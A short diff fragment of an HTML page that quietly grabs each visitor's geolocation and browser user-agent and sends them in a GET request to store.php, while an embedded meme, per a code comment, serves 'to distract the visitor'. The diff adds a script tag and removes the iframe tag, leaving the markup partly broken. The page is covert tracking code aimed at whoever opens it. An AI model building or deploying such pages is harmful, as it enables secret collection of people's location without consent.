@@ -21,7 +21,7 @@ navigator.geolocation .getCurrentPosition(showPosition); }
 browser user-agent, sending a GET
 
 request to store.php
-
+<script>
 function
 
 showPosition(position) {
@@ -40,7 +40,6 @@ XMLHttpRequest();
 
 "&uagent=" + navigator.userAgent, true);
 xhttp.send();
-
 }
 
 </script>
@@ -51,9 +50,7 @@ xhttp.send();
 
 <!-- Embedded iframe displaying
 
-the meme to distract the visitor -->
-
-<iframe
+the meme to distract the visitor
 
 src="[MEME_EMBED_URL_HERE]"
 
